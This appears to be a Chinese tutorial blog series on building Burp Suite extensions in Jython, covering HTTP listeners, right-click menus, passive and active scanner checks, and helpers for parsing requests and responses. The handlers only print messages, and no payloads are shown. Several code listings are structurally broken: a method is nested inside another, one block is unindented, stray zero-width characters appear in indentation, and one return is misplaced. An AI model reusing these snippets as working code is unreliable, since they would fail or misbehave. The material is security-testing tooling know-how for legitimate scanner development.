+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 注册一个 HTTP 监听器，那么当我们开启Burp监听的 HTTP 请求或收到的 HTTP 响应都会通知此监听器(需要导入IHttpListener)</span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender,IHttpListener):</span><br><span class="line">    def registerExtenderCallbacks(self,callbacks):</span><br><span class="line">    #注册HTTP监听器</span><br><span class="line">	callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line"># 注册菜单上下文</span><br><span class="line"># register message editor tab factory</span><br><span class="line">callbacks.registerMessageEditorTabFactory(self)</span><br><span class="line"># register menu item factory</span><br><span class="line">callbacks.registerContextMenuFactory(self)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注册扫描</strong></p>
+<p>callbacks.registerScannerCheck(self)</p>
+<p>getHelpers() 调用该方法返回对象IExtensionHelpers<br>此方法用于获取IExtensionHelpers对象，扩展可以使用该对象构建和分析HTTP请求。<br>self._helpers = callbacks.getHelpers()<br>那么代码就可以写成如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class BurpExtender(IBurpExtender, IHttpListener):</span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">        self._callbacks.setExtensionName(&quot;SQL Inject&quot;)</span><br><span class="line"></span><br><span class="line">        # 注册一个 HTTP 监听器，那么当我们开启Burp监听的 HTTP 请求或收到的 HTTP 响应都会通知此监听器</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">        # 注册菜单上下文</span><br><span class="line">        # register message editor tab factory</span><br><span class="line">        callbacks.registerMessageEditorTabFactory(self)</span><br><span class="line">        # register menu item factory</span><br><span class="line">        callbacks.registerContextMenuFactory(self)</span><br><span class="line"></span><br><span class="line">        # 注册扫描</span><br><span class="line">        callbacks.registerScannerCheck(self)</span><br></pre></td></tr></table></figure>
+
+<p>最简单的一个基础配置写好了，接下来实现功能。</p>
+<h3 id="0x05-processHttpMessage"><a href="#0x05-processHttpMessage" class="headerlink" title="0x05 processHttpMessage"></a><strong>0x05 processHttpMessage</strong></h3><p>刚才介绍了registerHttpListener方法注册了监听器，那么只要Burp监听到数据包，就会调用processHttpMessage方法。<br>processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)<br>下面是代码和参数的介绍</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">:param toolFlag: 一个标志，指示发出请求的Burp工具,Burp工具标志在IBurpExtenderCallbacks界面中定义.例如Proxy和Repeater触发插件</span><br><span class="line">:param messageIsRequest: 标记是否为请求数据包或响应数据包</span><br><span class="line">:param messageInfo: 要处理的请求&#x2F;响应的详细信息。扩展可以调用此对象上的setter方法来更新当前消息，从而修改Burp的行为。</span><br><span class="line">:return:</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里toolFlag的数字代表模块，例如哪个模块触发监听器，比如Proxy或者Repeater等</p>
+<p>官网给的链接：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks">https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/8.jpg" alt="图片"></p>
+<p>那么我只想要Proxy和Repeater触发插件的功能，代码则如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Proxy和Repeater触发插件</span><br><span class="line">if toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 4:</span><br></pre></td></tr></table></figure>
+
+<p>整体代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># Burp监听到数据包，就会调用processHttpMessage方法</span><br><span class="line">from burp import IBurpExtender, IHttpListener</span><br><span class="line">SLEEP_TIME &#x3D; 10</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IHttpListener):</span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">        self._callbacks.setExtensionName(&quot;processHttpMessage&quot;)</span><br><span class="line"></span><br><span class="line">        # 用于注册侦听器，该侦听器将通知任何Burp工具发出的请求和响应。扩展可以通过注册HTTP侦听器来执行自定义分析或修改这些消息。参数：listener- 实现IHttpListener接口的扩展创建的对象 。</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">        def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line">            :param toolFlag: 一个标志，指示发出请求的Burp工具,Burp工具标志在IBurpExtenderCallbacks界面中定义.例如Proxy和Repeater触发插件</span><br><span class="line">            :param messageIsRequest: 标记是否为请求数据包或响应数据包</span><br><span class="line">            :param messageInfo: 要处理的请求&#x2F;响应的详细信息。扩展可以调用此对象上的setter方法来更新当前消息，从而修改Burp的行为。</span><br><span class="line">            :return:</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line"># Proxy和Repeater触发插件</span><br><span class="line">if toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 4:</span><br><span class="line"></span><br><span class="line"># 处理响应内容</span><br><span class="line">	if not messageIsRequest:</span><br><span class="line">		print &#39;call processHttpMessage&#39;</span><br></pre></td></tr></table></figure>
+
+<p>实践：<br>加载py脚本</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/9.jpg" alt="图片"></p>
+<p>repeater发送数据包</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/10.jpg" alt="图片"></p>
+<p>成功触发方法</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/11.jpg" alt="图片"></p>
+<h3 id="0x06-createMenultems"><a href="#0x06-createMenultems" class="headerlink" title="0x06 createMenultems"></a><strong>0x06 createMenultems</strong></h3><p>创建上下文菜单，类似于下图所示</p>
+<p>官方api介绍地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IContextMenuFactory.html">https://portswigger.net/burp/extender/api/burp/IContextMenuFactory.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/12.jpg" alt="图片"></p>
+<p><strong>需要导入以下模块</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory</span><br><span class="line">from javax.swing import JMenuItem</span><br></pre></td></tr></table></figure>
+
+<p><strong>需要注册菜单</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># register message editor tab factory</span><br><span class="line">callbacks.registerMessageEditorTabFactory(self)</span><br><span class="line"># register menu item factory</span><br><span class="line">callbacks.registerContextMenuFactory(self)</span><br></pre></td></tr></table></figure>
+
+<p>创建上下文菜单，触发run方法</p>
+<p><strong>创建菜单右键</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def createMenuItems(self, invocation):</span><br><span class="line">    self.invocation &#x3D; invocation</span><br><span class="line">    menu_list &#x3D; []</span><br><span class="line">    menu_list.append(JMenuItem(&quot;Send to createMenuItems&quot;, None,</span><br><span class="line">    actionPerformed&#x3D;self.run))</span><br><span class="line">    return menu_list</span><br></pre></td></tr></table></figure>
+
+<p><strong>定义run方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def run(self, event):</span><br><span class="line">    print &#39;call createMenuItems&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>整体代码如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 右键菜单</span><br><span class="line">from burp import IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory</span><br><span class="line">from javax.swing import JMenuItem</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory):</span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">        self._callbacks.setExtensionName(&quot;createMenuItems&quot;)</span><br><span class="line"></span><br><span class="line">        # register message editor tab factory</span><br><span class="line">        callbacks.registerMessageEditorTabFactory(self)</span><br><span class="line">        # register menu item factory</span><br><span class="line">        callbacks.registerContextMenuFactory(self)</span><br><span class="line"></span><br><span class="line">    # 创建菜单右键</span><br><span class="line">    def createMenuItems(self, invocation):</span><br><span class="line">        self.invocation &#x3D; invocation</span><br><span class="line">        menu_list &#x3D; []</span><br><span class="line">        menu_list.append(JMenuItem(&quot;Send to createMenuItems&quot;, None,</span><br><span class="line">        actionPerformed&#x3D;self.run))</span><br><span class="line">        return menu_list</span><br><span class="line"></span><br><span class="line">    def run(self, event):</span><br><span class="line">    	print &#39;call createMenuItems&#39;</span><br></pre></td></tr></table></figure>
+
+<p>实践：<br>右键点击Send to createMenuItems</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/13.jpg" alt="图片"></p>
+<p>成功触发</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/14.jpg" alt="图片"></p>
+<p>这里抛出一个问题：那就是界面卡死问题。当我们想写一个检测注入漏洞的插件时，payload很多，那么burp会等待payload运行完才会反应，这样就陷入了卡死。</p>
+<p>下节课讲解如何解决payload很多，burp卡死问题。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（二）"><a href="#Burp-Extender-Apis-插件开发-（二）" class="headerlink" title="Burp Extender Apis 插件开发 （二）"></a>Burp Extender Apis 插件开发 （二）</h1><h3 id="0x01-被动扫描doPassiveScan"><a href="#0x01-被动扫描doPassiveScan" class="headerlink" title="0x01 被动扫描doPassiveScan"></a><strong>0x01 被动扫描doPassiveScan</strong></h3><hr>
+<p>被动扫描，burp默认是开启被动扫描的，即每次的数据包都会放到被动扫描模块进行扫描。那么我们可以重定义被动扫描方法，让每次数据包的被动扫描发送我们定义的payloads。</p>
+<p>官方api地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IScannerCheck.html">https://portswigger.net/burp/extender/api/burp/IScannerCheck.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/15.jpg" alt="图片"></p>
+<p>注：被动扫描要注意一点，那就是修改数据包的时候，如果你在后台也开启插件，那么可能会造成后台数据修改！所以被动扫描插件最好只扫描前台，到了后台一定要关闭掉。</p>
+<p>导入模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender, IScannerCheck</span><br></pre></td></tr></table></figure>
+
+<p>注册扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callbacks.registerScannerCheck(self)</span><br></pre></td></tr></table></figure>
+
+<p>定义被动扫描方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">   print &#39;call doPassiveScan&#39;</span><br></pre></td></tr></table></figure>
+
+<p>整体代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 被动扫描</span><br><span class="line">from burp import IBurpExtender, IScannerCheck</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IScannerCheck):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">​     # Required for easier debugging:</span><br><span class="line">​     sys.stdout &#x3D; callbacks.getStdout()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">​     self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">​     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">​     self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。</span><br><span class="line">​     self._callbacks.setExtensionName(&quot;demo_doPassiveScan&quot;)</span><br><span class="line"></span><br><span class="line">​     # 注册扫描</span><br><span class="line">​     callbacks.registerScannerCheck(self)</span><br><span class="line"></span><br><span class="line">   def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">     print &#39;call doPassiveScan&#39;</span><br></pre></td></tr></table></figure>
+
+<p>实践：</p>
+<p>抓到数据包后并放掉的时候触发</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/16.jpg" alt="图片"></p>
+<p>扫描模块</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/17.jpg" alt="图片"></p>
+<p>成功触发</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/18.jpg" alt="图片"></p>
+<h3 id="0x02-主动扫描doActiveScan"><a href="#0x02-主动扫描doActiveScan" class="headerlink" title="0x02 主动扫描doActiveScan"></a><strong>0x02 主动扫描doActiveScan</strong></h3><p>主动扫描，burp默认是关闭主动扫描的。</p>
+<p>官方api地址：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IScannerCheck.html">https://portswigger.net/burp/extender/api/burp/IScannerCheck.html</a></p>
+<p>这里有两个注意点：</p>
+<ol>
+<li>调用主动扫描的插件时，将burp默认的payload关闭</li>
+<li>开启主动扫描的时候，也会默认被动扫描。所以如果同时加载主动扫描插件和被动扫描插件时，一定要注意这点，避免功能重复</li>
+</ol>
+<p>打开burpsuite后，先关闭burp的默认扫描payload</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/19.jpg" alt="图片"></p>
+<p>除了方法和被动扫描不一样，其余代码一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def doActiveScan(self, baseRequestResponse, insertionPoint):</span><br><span class="line">   print &#39;call doActiveScan&#39;</span><br></pre></td></tr></table></figure>
+
+<p>整体代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"># 主动扫描</span><br><span class="line">from burp import IBurpExtender, IScannerCheck</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IScannerCheck):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line"></span><br><span class="line">​     # Required for easier debugging:</span><br><span class="line">​     sys.stdout &#x3D; callbacks.getStdout()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。</span><br><span class="line">​     self._callbacks &#x3D; callbacks</span><br><span class="line"></span><br><span class="line">​     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">​     self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line"></span><br><span class="line">​     # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。</span><br><span class="line">​     self._callbacks.setExtensionName(&quot;demo doActiveScan&quot;)</span><br><span class="line"></span><br><span class="line">​     # 注册扫描</span><br><span class="line">​     callbacks.registerScannerCheck(self)</span><br><span class="line"></span><br><span class="line">   def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">     print &#39;call doPassiveScan&#39;</span><br><span class="line"></span><br><span class="line">   def doActiveScan(self, baseRequestResponse, insertionPoint):</span><br><span class="line">     print &#39;call doActiveScan&#39;</span><br></pre></td></tr></table></figure>
+
+<p>实践：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/20.jpg" alt="图片"></p>
+<p>加入到扫描队列里</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/21.jpg" alt="图片"></p>
+<p>成功触发方法</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/22.jpg" alt="图片"></p>
+<p>通过这几节课我们已经掌握了burpsuite的常用几个模块调用，下节课学习对抓到的数据包进行分析，分离出每个请求包的参数，每个响应包的参数等信息。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（三）"><a href="#Burp-Extender-Apis-插件开发-（三）" class="headerlink" title="Burp Extender Apis 插件开发 （三）"></a>Burp Extender Apis 插件开发 （三）</h1><h3 id="0x01-IHttpRequestResponse"><a href="#0x01-IHttpRequestResponse" class="headerlink" title="0x01 IHttpRequestResponse"></a><strong>0x01 IHttpRequestResponse</strong></h3><p>此接口用于检索和更新有关HTTP消息的详细信息</p>
+<p>官网api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IHttpRequestResponse.html">https://portswigger.net/burp/extender/api/burp/IHttpRequestResponse.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/23.jpg" alt="图片"></p>
+<p>例如监听器，扫描模块，菜单模块的各方法中IHttpRequestResponse对象分别是以下变量名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">processHttpMessage --&gt; messageInfo</span><br><span class="line">doPassiveScan和doActiveScan --&gt; baseRequestResponse，</span><br><span class="line">createMenuItems --&gt; invocation.getSelectedMessages()[0]</span><br></pre></td></tr></table></figure>
+
+<p>方法名和对应的参数名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo)</span><br><span class="line">def doPassiveScan(self, baseRequestResponse)</span><br><span class="line">def doActiveScan(self, baseRequestResponse, insertionPoint)</span><br><span class="line">def createMenuItems(self, invocation):</span><br><span class="line">self.invocation.getSelectedMessages()[0]</span><br></pre></td></tr></table></figure>
+
+<p>接下来介绍下常用的三个方法：</p>
+<ul>
+<li>IHttpRequestResponse.getRequest()方法返回请求包</li>
+<li>IHttpRequestResponse.getResponse()方法返回相应包</li>
+<li>IHttpRequestResponse.getHttpService()方法返回请求/响应的http服务</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request &#x3D; messageInfo.getRequest()</span><br><span class="line">response &#x3D; currentRequestResponse.getResponse()</span><br><span class="line">httpService &#x3D; currentRequestResponse.getHttpService()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-IHttpService"><a href="#0x02-IHttpService" class="headerlink" title="0x02 IHttpService"></a><strong>0x02 IHttpService</strong></h3><p>该接口获取主机端口和协议</p>
+<p>官方API：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IHttpService.html">https://portswigger.net/burp/extender/api/burp/IHttpService.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/24.jpg" alt="图片"></p>
+<p>代码例子</p>
+<p><strong>获取服务端的信息，主机地址，端口，协议</strong></p>
+<p>def get_server_info(self, httpService):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">host &#x3D; httpService.getHost()</span><br><span class="line">port &#x3D; httpService.getPort()</span><br><span class="line">protocol &#x3D; httpService.getProtocol()</span><br><span class="line">ishttps &#x3D; False</span><br><span class="line">if protocol &#x3D;&#x3D; &#39;https&#39;:</span><br><span class="line">  ishttps &#x3D; True</span><br><span class="line">  return host, port, protocol, ishttps</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-IExtensionHelpers"><a href="#0x03-IExtensionHelpers" class="headerlink" title="0x03 IExtensionHelpers"></a><strong>0x03 IExtensionHelpers</strong></h3><hr>
+<p>对请求包/响应包进行分析，使用IExtensionHelpers接口。看下官方介绍，可以看到IExtensionHelpers对象的方法都是用于分析HTTP请求。</p>
+<p>官方API：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html">https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/25.jpg" alt="图片"></p>
+<p>analyzeRequest方法用于分析HTTP请求，并获取有关它的各种关键详细信息，返回IRequestInfo对象<br>analyzeResponse方法用于分析HTTP响应，并获取有关它的各种关键详细信息，返回IResponseInfo对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">analyzedRequest &#x3D; self._helpers.analyzeRequest(request)</span><br><span class="line">analyzedResponse &#x3D; self._helpers.analyzeResponse(response)</span><br></pre></td></tr></table></figure>
+
+<p>这里回顾下self._helpers从哪来，忘了的同学可以回到第二课。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class BurpExtender(IBurpExtender, IHttpListener):</span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">     self._callbacks &#x3D; callbacks</span><br><span class="line">     # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。</span><br><span class="line">     self._helpers &#x3D; callbacks.getHelpers()</span><br></pre></td></tr></table></figure>
+
